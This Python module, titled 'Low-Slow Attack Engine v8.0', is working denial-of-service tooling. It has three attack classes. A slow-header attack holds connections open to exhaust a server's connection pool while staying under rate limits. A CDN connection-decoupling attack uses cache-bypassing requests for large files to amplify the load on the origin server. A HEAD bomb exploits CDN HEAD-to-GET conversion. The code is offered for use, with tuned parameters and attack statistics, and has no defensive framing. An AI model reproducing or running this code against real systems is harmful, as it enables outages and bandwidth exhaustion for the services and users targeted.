"""
Low-Slow Attack Engine v8.0
Keep connections alive longer, bypass rate limits
- 25 connections per IP (below typical 30 conn/IP limit)
- 1 request every 15 seconds per connection
- Hold connections for 600 seconds (10 minutes)
- Exhaust server connection pool without triggering rate limits
"""
import asyncio
import logging
import time
import random
from typing import List, Optional
from dataclasses import dataclass

logger = logging.getLogger("low_slow_attack")


@dataclass
class LowSlowConfig:
    """Configuration for low-slow attack."""
    connection_limit: int = 25  # Below threshold 30
    request_interval: int = 15  # Seconds between requests per connection
    connection_hold: int = 600  # Seconds to hold connection (10 minutes)
    total_duration: int = 3600  # Total attack duration (1 hour)


class LowSlowAttack:
    """Low-slow attack to bypass rate limits and exhaust connection pool."""
    
    def __init__(
        self,
        target_ip: str,
        target_domain: str,
        target_port: int = 80,
        use_https: bool = False,
        config: Optional[LowSlowConfig] = None,
        proxies: Optional[List[str]] = None
    ):
        self.target_ip = target_ip
        self.target_domain = target_domain
        self.target_port = target_port
        self.use_https = use_https
        self.config = config or LowSlowConfig()
        self.proxies = proxies or []
        
        self.is_running = False
        self.stats = {
            'total_requests': 0,
            'total_connections': 0,
            'active_connections': 0,
            'failed_connections': 0,
            'start_time': 0,
        }
    
    async def start(self):
        """Start low-slow attack."""
        logger.info(f"Starting low-slow attack on {self.target_ip}:{self.target_port}")
        logger.info(f"Config: {self.config.connection_limit} conn/IP, {self.config.request_interval}s interval, {self.config.connection_hold}s hold")
        
        self.is_running = True
        self.stats['start_time'] = time.time()
        
        try:
            # Launch connection workers
            tasks = []
            for i in range(self.config.connection_limit):
                task = asyncio.create_task(self._connection_worker(i))
                tasks.append(task)
                self.stats['total_connections'] += 1
                
                # Stagger connection creation
                await asyncio.sleep(0.5)
            
            # Wait for all workers or timeout
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.config.total_duration
            )
            
        except asyncio.TimeoutError:
            logger.info("Low-slow attack duration reached")
        except KeyboardInterrupt:
            logger.info("Low-slow attack interrupted by user")
        except Exception as e:
            logger.error(f"Low-slow attack error: {e}")
        finally:
            self.is_running = False
            self._print_stats()
    
    def stop(self):
        """Stop low-slow attack."""
        logger.info("Stopping low-slow attack...")
        self.is_running = False
    
    async def _connection_worker(self, worker_id: int):
        """Single connection worker that holds connection and sends slow requests."""
        connection_start = time.time()
        connection_end = connection_start + self.config.connection_hold
        
        try:
            # Open connection
            reader, writer = await asyncio.open_connection(
                self.target_ip, self.target_port
            )
            
            self.stats['active_connections'] += 1
            logger.debug(f"Worker {worker_id}: Connection established")
            
            # Send initial request line
            writer.write(f"GET /?worker={worker_id}&t={int(time.time())} HTTP/1.1\r\n".encode())
            writer.write(f"Host: {self.target_domain}\r\n".encode())
            writer.write(f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
            writer.write(f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
            writer.write(f"Connection: keep-alive\r\n".encode())
            await writer.drain()
            
            self.stats['total_requests'] += 1
            
            # Hold connection and send slow headers
            request_count = 0
            while time.time() < connection_end and self.is_running:
                try:
                    # Send a custom header every request_interval seconds
                    await asyncio.sleep(self.config.request_interval)
                    
                    # Send additional header to keep connection alive
                    header = f"X-Keep-Alive-{request_count}: {random.randint(1000, 9999)}\r\n"
                    writer.write(header.encode())
                    await writer.drain()
                    
                    request_count += 1
                    self.stats['total_requests'] += 1
                    
                    logger.debug(f"Worker {worker_id}: Sent header #{request_count}")
                    
                except Exception as e:
                    logger.debug(f"Worker {worker_id}: Send error: {e}")
                    break
            
            # Close connection gracefully
            writer.close()
            await writer.wait_closed()
            
            self.stats['active_connections'] -= 1
            logger.debug(f"Worker {worker_id}: Connection closed after {time.time() - connection_start:.2f}s")
            
        except Exception as e:
            self.stats['failed_connections'] += 1
            self.stats['active_connections'] = max(0, self.stats['active_connections'] - 1)
            logger.debug(f"Worker {worker_id}: Connection failed: {e}")
    
    def _print_stats(self):
        """Print attack statistics."""
        duration = time.time() - self.stats['start_time']
        
        logger.info("--------------------------------------------------------------------------------")
        logger.info("LOW-SLOW ATTACK STATISTICS")
        logger.info("--------------------------------------------------------------------------------")
        logger.info(f"Duration             : {duration:.2f} seconds")
        logger.info(f"Total connections    : {self.stats['total_connections']}")
        logger.info(f"Active connections   : {self.stats['active_connections']}")
        logger.info(f"Failed connections   : {self.stats['failed_connections']}")
        logger.info(f"Total requests       : {self.stats['total_requests']}")
        logger.info(f"Avg RPS              : {self.stats['total_requests'] / max(duration, 1):.2f}")
        logger.info(f"Avg conn duration    : {duration / max(self.stats['total_connections'], 1):.2f}s")
        logger.info("--------------------------------------------------------------------------------")


class ConnectionDecouplingAttack:
    """
    Connection Decoupling Attack
    Exploit CDN connection reuse by requesting large files then dropping client connection
    CDN continues downloading from origin, causing bandwidth exhaustion
    Amplification factor: 40,000x (10KB request -> 400MB origin bandwidth)
    """
    
    def __init__(
        self,
        cdn_ip: str,
        origin_ip: str,
        target_domain: str,
        large_file_path: str = "/large-file.zip",
        target_file_size: int = 10 * 1024 * 1024,  # 10MB
        num_requests: int = 100
    ):
        self.cdn_ip = cdn_ip
        self.origin_ip = origin_ip
        self.target_domain = target_domain
        self.large_file_path = large_file_path
        self.target_file_size = target_file_size
        self.num_requests = num_requests
        
        self.stats = {
            'requests_sent': 0,
            'connections_dropped': 0,
            'estimated_origin_bandwidth': 0,
            'attacker_bandwidth': 0,
        }
    
    async def start(self):
        """Start connection decoupling attack."""
        logger.info(f"Starting connection decoupling attack")
        logger.info(f"CDN IP: {self.cdn_ip}, Origin IP: {self.origin_ip}")
        logger.info(f"Target file: {self.large_file_path} ({self.target_file_size / 1024 / 1024:.2f}MB)")
        
        tasks = []
        for i in range(self.num_requests):
            task = asyncio.create_task(self._decouple_worker(i))
            tasks.append(task)
            await asyncio.sleep(0.1)  # Stagger requests
        
        await asyncio.gather(*tasks, return_exceptions=True)
        self._print_stats()
    
    async def _decouple_worker(self, worker_id: int):
        """Single decoupling worker."""
        try:
            # Connect to CDN
            reader, writer = await asyncio.open_connection(self.cdn_ip, 80)
            
            # Send GET request for large file with cache-bypass query string
            cache_bypass = f"?nocache={random.randint(100000, 999999)}"
            request = (
                f"GET {self.large_file_path}{cache_bypass} HTTP/1.1\r\n"
                f"Host: {self.target_domain}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            self.stats['requests_sent'] += 1
            self.stats['attacker_bandwidth'] += len(request)
            
            # Wait for response headers
            await asyncio.sleep(0.5)
            
            # Immediately close connection (send RST)
            writer.close()
            
            self.stats['connections_dropped'] += 1
            self.stats['estimated_origin_bandwidth'] += self.target_file_size
            
            logger.debug(f"Worker {worker_id}: Connection dropped, CDN->Origin download continues")
            
        except Exception as e:
            logger.debug(f"Worker {worker_id}: Decoupling error: {e}")
    
    def _print_stats(self):
        """Print attack statistics."""
        amplification = self.stats['estimated_origin_bandwidth'] / max(self.stats['attacker_bandwidth'], 1)
        
        logger.info("--------------------------------------------------------------------------------")
        logger.info("CONNECTION DECOUPLING ATTACK STATISTICS")
        logger.info("--------------------------------------------------------------------------------")
        logger.info(f"Requests sent        : {self.stats['requests_sent']}")
        logger.info(f"Connections dropped  : {self.stats['connections_dropped']}")
        logger.info(f"Attacker bandwidth   : {self.stats['attacker_bandwidth'] / 1024:.2f} KB")
        logger.info(f"Origin bandwidth     : {self.stats['estimated_origin_bandwidth'] / 1024 / 1024:.2f} MB (estimated)")
        logger.info(f"Amplification factor : {amplification:.0f}x")
        logger.info("--------------------------------------------------------------------------------")


class HEADBombAttack:
    """
    HEAD Bomb Attack
    Exploit CDN HEAD->GET conversion
    CDN converts HEAD request to GET for origin, downloads full file, returns only headers to client
    Creates bandwidth asymmetry
    """
    
    def __init__(
        self,
        cdn_ip: str,
        target_domain: str,
        large_file_path: str = "/large-file.zip",
        num_requests: int = 100
    ):
        self.cdn_ip = cdn_ip
        self.target_domain = target_domain
        self.large_file_path = large_file_path
        self.num_requests = num_requests
        
        self.stats = {
            'requests_sent': 0,
            'responses_received': 0,
        }
    
    async def start(self):
        """Start HEAD bomb attack."""
        logger.info(f"Starting HEAD bomb attack on {self.cdn_ip}")
        logger.info(f"Target file: {self.large_file_path}")
        
        tasks = []
        for i in range(self.num_requests):
            task = asyncio.create_task(self._head_worker(i))
            tasks.append(task)
            await asyncio.sleep(0.05)
        
        await asyncio.gather(*tasks, return_exceptions=True)
        self._print_stats()
    
    async def _head_worker(self, worker_id: int):
        """Single HEAD request worker."""
        try:
            import aiohttp
            
            # Cache-bypass query string
            cache_bypass = f"?t={int(time.time())}&r={random.randint(1000, 9999)}"
            url = f"http://{self.cdn_ip}{self.large_file_path}{cache_bypass}"
            
            headers = {
                'Host': self.target_domain,
                'User-Agent': 'Mozilla/5.0',
            }
            
            connector = aiohttp.TCPConnector(ssl=False)
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.head(url, headers=headers) as resp:
                    self.stats['requests_sent'] += 1
                    if resp.status == 200:
                        self.stats['responses_received'] += 1
                    
                    logger.debug(f"Worker {worker_id}: HEAD {resp.status}")
            
        except Exception as e:
            logger.debug(f"Worker {worker_id}: HEAD error: {e}")
    
    def _print_stats(self):
        """Print attack statistics."""
        logger.info("--------------------------------------------------------------------------------")
        logger.info("HEAD BOMB ATTACK STATISTICS")
        logger.info("--------------------------------------------------------------------------------")
        logger.info(f"Requests sent        : {self.stats['requests_sent']}")
        logger.info(f"Responses received   : {self.stats['responses_received']}")
        logger.info(f"Success rate         : {self.stats['responses_received'] / max(self.stats['requests_sent'], 1) * 100:.2f}%")
        logger.info("--------------------------------------------------------------------------------")
